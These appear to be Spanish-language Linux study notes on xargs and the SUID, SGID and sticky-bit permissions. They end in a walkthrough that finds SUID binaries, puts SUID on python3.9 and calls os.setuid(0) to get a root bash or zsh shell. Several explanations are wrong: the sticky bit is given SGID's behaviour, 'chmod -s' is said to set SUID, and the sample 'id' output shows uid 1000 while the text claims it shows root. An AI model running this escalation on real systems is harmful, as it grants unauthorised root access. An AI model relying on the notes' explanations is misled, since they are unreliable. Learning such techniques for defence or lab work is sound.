
```
wich python3.9
                    @(forma lenta)
ls

	which python3.9 | xargs ls -l   *forma rapida*
```

#### con xargs se paralelizan comandos   [[xargs]]

permisos suid y sgid

**Permisos SUID, SGID y Sticky Bit en Linux**

Los permisos SUID, SGID y [[Stiky bit]] son mecanismos para otorgar permisos especiales a archivos y directorios en sistemas GNU/Linux. A continuación, se explicarán brevemente cada uno de ellos y cómo configurarlos.

**SUID (Set User ID)**

El bit SUID se activa al ejecutar el comando `chmod` con la opción `-s`. Cuando se activa el bit SUID sobre un fichero, el que lo ejecute tendrá los mismos permisos que el que creó el archivo. Esto puede ser útil en algunas ocasiones, aunque hay que utilizarlo con cuidado, ya que puede acarrear problemas de seguridad.

Ejemplo:

```
chmod u+s archivo
```

**SGID (Set Group ID)**

El bit SGID es similar al SUID, pero a nivel de grupo. Cuando se activa el bit SGID sobre un fichero o directorio, el que lo ejecute tendrá los mismos permisos que el grupo al que pertenece. Esto es útil para configurar directorios compartidos y permitir que los usuarios que pertenecen al mismo grupo puedan leer y escribir en ellos.

Ejemplo:

```
chmod g+s directorio
```

**Sticky Bit**

El bit Sticky Bit se activa al ejecutar el comando `chmod` con la opción `t`. Cuando se activa el bit Sticky Bit sobre un directorio, cualquier archivo creado en ese directorio tendrá asignado el grupo al que pertenece el directorio, y no el grupo del usuario que lo creó. Esto es útil para crear directorios compartidos y asegurar que los archivos creados en ellos tengan los permisos correctos.

Ejemplo:

```
chmod +t directorio
```

**Consejos**

- Utilizar los permisos SUID y SGID con cuidado, ya que pueden acarrear problemas de seguridad.
- Utilizar el bit Sticky Bit en directorios compartidos para asegurar que los archivos creados en ellos tengan los permisos correctos.
- Verificar regularmente la configuración de los permisos en los sistemas GNU/Linux para asegurarse de que no haya archivos o directorios con permisos no deseados.

En resumen, los permisos SUID, SGID y Sticky Bit son herramientas importantes para configurar los permisos en sistemas GNU/Linux, pero es importante utilizarlos con cuidado y seguimiento para asegurarse de que no se produzcan problemas de seguridad.


## para buscar permisos suid

```
find / -perm -4000 -exec ls -la {} \; 2>/dev/null

```

#find busca / desde la raiz -perm (permisos) -4000 (suid) 

## tambien:

```
find / -type f -perm -4000 2>/dev/null
```

*-type f* es el filtro y f el tipo de archivo a buscar

supongmos que hay un python3.9 que tiene permiso SUID y pertenece al grupo (root)

`which python3.9 | xargs ls -l`

#### le damos los permisos para que sea suid

```
chmod u+s python3.9
```

```
chmod 4755 /usr/bin/python3.9
```
#### entonces nos metemos alli

`python3.9`

importamos la libreria os

`>>import os`
`>>os.setuid(0)`
`>>os.system("whoami")`
`root`
`>>os.system("id")`

y la respuesta debe ser una cosa asi

`uid=1000(heavenblack) gid=1000(heavenblack) groups=1000(heavenblack),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),113(wireshark),116(bluetooth),129(scanner),136(kaboxer)
`
en la bque nos indica que es que estamos dentro del grupo de root

#### una forma mas comoda es decirle que nos de una bash luego de escalar los privilegios

```
>>os.system("bash")
```

#### o, quiero que me des una zsh

```
>>os.system("zsh")
```

### tambien se puede hacer con SGUID que funciona igualmente para los grupos

`chmod 2755` 

```
chmod g+s /usr/bin/python3.9
```
